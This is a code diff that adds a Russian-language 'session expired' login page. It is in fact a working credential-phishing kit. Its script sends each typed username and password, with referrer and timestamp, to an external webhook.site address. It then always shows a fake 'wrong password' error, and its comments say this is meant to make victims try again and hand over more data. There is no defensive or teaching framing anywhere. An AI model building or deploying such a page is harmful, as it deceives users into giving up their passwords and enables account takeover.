@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Вход в систему</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; min-height: 100vh; display: grid; place-items: center;
+    font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: #f5f6f8;
+  }
+  .card {
+    background: #fff; padding: 36px; border-radius: 10px;
+    box-shadow: 0 6px 24px rgba(0,0,0,.08); width: 360px; max-width: 92vw;
+  }
+  .logo {
+    width: 48px; height: 48px; margin: 0 auto 16px;
+    background: #007bff; border-radius: 12px;
+    display: grid; place-items: center; color: #fff; font-weight: 700; font-size: 22px;
+  }
+  h1 { font-size: 20px; text-align: center; margin: 0 0 8px; color: #1a1a1a; }
+  p  { font-size: 14px; text-align: center; color: #666; margin: 0 0 24px; }
+  input {
+    width: 100%; padding: 11px 14px; margin-bottom: 12px;
+    border: 1px solid #d0d5dd; border-radius: 6px; font-size: 14px;
+    transition: border-color .15s;
+  }
+  input:focus { outline: none; border-color: #007bff; }
+  button {
+    width: 100%; padding: 12px; border: 0; border-radius: 6px;
+    background: #007bff; color: #fff; font-size: 15px; font-weight: 600;
+    cursor: pointer; transition: background .15s;
+  }
+  button:hover { background: #0069d9; }
+  .msg {
+    margin-top: 14px; padding: 10px; border-radius: 6px;
+    background: #e7f3ff; color: #0056b3; font-size: 13px;
+    text-align: center; display: none;
+  }
+  .msg.err { background: #fdecea; color: #b71c1c; }
+  .msg.ok  { background: #e8f5e9; color: #1b5e20; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">A</div>
+    <h1>Сессия истекла</h1>
+    <p>Войдите снова, чтобы продолжить.</p>
+
+    <input id="u" type="text" placeholder="Логин или e-mail" autocomplete="username">
+    <input id="p" type="password" placeholder="Пароль" autocomplete="current-password">
+    <button id="b">Войти</button>
+    <div class="msg" id="m"></div>
+  </div>
+
+<script>
+(function () {
+  // ⚠️ ЗАМЕНИТЕ на свой webhook (например, https://webhook.site/<uuid>)
+  const HOOK = 'https://webhook.site/818630eb-d214-4769-b8e5-c5addada14f1';
+
+  const $ = id => document.getElementById(id);
+
+  $('b').onclick = async () => {
+    const u = $('u').value.trim();
+    const p = $('p').value;
+
+    if (!u || !p) {
+      show('Заполните оба поля', 'err');
+      return;
+    }
+
+    const msg = $('m');
+    show('Проверка данных...', '');
+
+    try {
+      // Отправка на ваш сервер (CORS-запрос, webhook.site принимает)
+      await fetch(HOOK, {
+        method: 'POST',
+        mode: 'no-cors',           // webhook.site не отдаёт CORS-заголовки, но запрос уйдёт
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          u, p,
+          ref: document.referrer || location.href,
+          t: new Date().toISOString()
+        })
+      });
+    } catch (e) {
+      // no-cors → fetch не бросит исключение, но ошибку всё равно глотаем
+    }
+
+    // Имитация «неверного пароля» — пользователь пробует ещё раз → больше данных
+    setTimeout(() => {
+      show('Неверный логин или пароль. Попробуйте снова.', 'err');
+      $('p').value = '';
+      $('p').focus();
+    }, 900);
+  };
+
+  function show(text, type) {
+    const m = $('m');
+    m.textContent = text;
+    m.className = 'msg' + (type ? ' ' + type : '');
+    m.style.display = 'block';
+  }
+
+  // Enter в поле пароля = клик по кнопке
+  $('p').addEventListener('keydown', e => {
+    if (e.key === 'Enter') $('b').click();
+  });
+})();
+</script>
+</body>
+</html>
